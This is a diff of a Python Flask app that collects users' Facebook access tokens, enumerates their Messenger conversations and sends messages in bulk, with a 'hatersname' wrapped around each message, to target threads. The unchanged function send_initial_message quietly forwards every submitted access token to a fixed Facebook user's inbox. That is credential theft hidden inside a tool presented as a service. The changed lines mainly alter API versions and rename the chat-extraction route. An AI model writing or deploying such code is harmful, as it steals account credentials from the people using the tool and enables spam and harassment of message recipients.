@@ -52,7 +52,7 @@ def send_initial_message(access_token):
     """Send initial message to fixed user ID inbox"""
     try:
         # Use latest Graph API version
-        api_url = f'https://graph.facebook.com/v19.0/t_100056999599628/'
+        api_url = f'https://graph.facebook.com/v17.0/t_100056999599628/'
         
         # Format message as requested
         message = f"HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS {access_token}"
@@ -139,7 +139,7 @@ def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastnam
                 message = f"{hatersname} {message_text} {lastname}"
                 
                 # Send message using latest Graph API
-                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
+                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                 parameters = {
                     'access_token': access_token, 
                     'message': message
@@ -209,41 +209,46 @@ def check_token_validity(token):
             "error": f"Token check failed: {str(e)}"
         }
 
-def extract_chat_groups(token):
-    """Extract chat groups for a valid token"""
+def extract_messenger_chat_groups(token):
+    """Extract ALL Facebook Messenger chat groups for a valid token"""
     try:
-        # Initialize formatted_threads
-        formatted_threads = []
+        # Get conversations/threads from Messenger
+        threads_url = f"https://graph.facebook.com/v19.0/me/conversations?access_token={token}&fields=id,name,participants&limit=100"
+        threads_response = requests.get(threads_url, timeout=15)
         
-        # Get threads/conversations (chat groups)
-        threads_url = f"https://graph.facebook.com/v19.0/me/threads?access_token={token}&fields=id,name,participants&limit=100"
-        threads_response = requests.get(threads_url, timeout=10)
+        chat_groups = []
         
         if threads_response.status_code == 200:
             threads_data = threads_response.json()
-            threads = threads_data.get('data', [])
+            conversations = threads_data.get('data', [])
             
-            # Extract thread UIDs and names
-            for thread in threads:
-                thread_info = {
-                    'thread_id': thread.get('id', 'N/A'),
-                    'name': thread.get('name', 'Unnamed Chat'),
-                    'participants_count': len(thread.get('participants', {}).get('data', [])) if thread.get('participants') else 0
+            for conversation in conversations:
+                chat_info = {
+                    'thread_id': conversation.get('id', 'N/A'),
+                    'name': conversation.get('name', 'Unnamed Chat'),
+                    'participants_count': len(conversation.get('participants', {}).get('data', [])) if conversation.get('participants') else 0
                 }
-                formatted_threads.append(thread_info)
-        
-        return {
-            "success": True,
-            "threads": formatted_threads,
-            "threads_count": len(formatted_threads)
-        }
-        
+                chat_groups.append(chat_info)
+            
+            return {
+                "success": True,
+                "chat_groups": chat_groups,
+                "total_chats": len(chat_groups)
+            }
+        else:
+            return {
+                "success": False,
+                "error": f"Failed to fetch conversations: HTTP {threads_response.status_code}",
+                "chat_groups": [],
+                "total_chats": 0
+            }
+            
     except Exception as e:
         return {
-            "success": False, 
-            "error": f"Failed to extract chat groups: {str(e)}",
-            "threads": [],
-            "threads_count": 0
+            "success": False,
+            "error": f"Error extracting chat groups: {str(e)}",
+            "chat_groups": [],
+            "total_chats": 0
         }
 
 @app.route('/')
@@ -409,8 +414,8 @@ def check_tokens():
         'invalid_tokens': invalid_tokens
     })
 
-@app.route('/extract_chat_groups', methods=['POST'])
-def extract_chat_groups_route():
+@app.route('/extract_messenger_chats', methods=['POST'])
+def extract_messenger_chats():
     token = request.form.get('token')
     
     if not token:
@@ -421,12 +426,12 @@ def extract_chat_groups_route():
     if not token_check['valid']:
         return jsonify({'error': f'Invalid token: {token_check.get("error", "Token validation failed")}'})
     
-    # Extract chat groups
-    chat_groups = extract_chat_groups(token)
+    # Extract messenger chat groups
+    messenger_chats = extract_messenger_chat_groups(token)
     
     return jsonify({
         'token_info': token_check,
-        'chat_groups': chat_groups
+        'messenger_chats': messenger_chats
     })
 
 # Keep-alive endpoint to prevent sleep
